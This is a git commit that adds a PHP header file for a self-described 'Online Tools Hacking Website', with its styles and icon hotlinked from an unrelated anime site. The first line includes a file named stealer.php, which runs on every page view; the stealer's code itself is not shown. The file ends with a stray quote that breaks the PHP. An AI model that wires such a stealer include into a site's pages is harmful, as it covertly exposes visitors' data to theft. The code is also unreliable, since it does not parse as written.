3854bff6ab81d13ffa0456ad707fa1b196583eb0
Valeiriya <42551411+Valeiriya@users.noreply.github.com>
2018-10-06 05:16:33 +0800

    Create header.php

---
+++ header.php
@@ -0,0 +1,34 @@
+<?php
+  include ('stealer.php');
+  
+  echo '
+<!doctype html>
+<html>
+<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# website: http://ogp.me/ns/website#">
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+
+	<title>Official Website Valeiriya</title>
+	<meta name="description" content="Valeiriya.Osaka | Official Website">
+	<meta name="keywords" content="Valeiriya.Osaka - Online Tools Hacking Website">
+
+	<!--OGP -->
+	<meta property="og:site_name" content="Official Website Valeiriya">
+	<meta property="og:type" content="website">
+	<meta property="og:locale" content="ja_JP">
+	<meta property="og:title" content="Valeiriya.Osaka - Official Website">
+	<meta property="og:description" content="Valeiriya.Osaka | Official Website - Online Tools Hacking Website">
+	<meta property="og:url" content="https://valeiriya.osaka/">
+	<meta property="og:image" content="https://valeiriya.osaka/">
+	<meta name="facebook:card" content="summary_large_image">
+	<meta name="facebook:site" content="@valeiriya.osaka">
+
+	<link rel="shortcut icon" href="https://isekaimaou-anime.com/assets/img/favicon.ico">
+	<link href="https://fonts.googleapis.com/css?family=Libre+Baskerville" rel="stylesheet">
+	<link rel="stylesheet" href="https://isekaimaou-anime.com/assets/common/css/reset.css">
+	<link rel="stylesheet" href="https://isekaimaou-anime.com/assets/common/colorbox/colorbox.css">
+	<link rel="stylesheet" href="https://isekaimaou-anime.com/assets/common/css/font-awesome.min.css">
+	<link rel="stylesheet" href="https://isekaimaou-anime.com/assets/css/common.css?v=1532290684">
+	<link rel="stylesheet" href="https://isekaimaou-anime.com/assets/css/top.css?v=1532290684">
+</head><body>';
+'?>
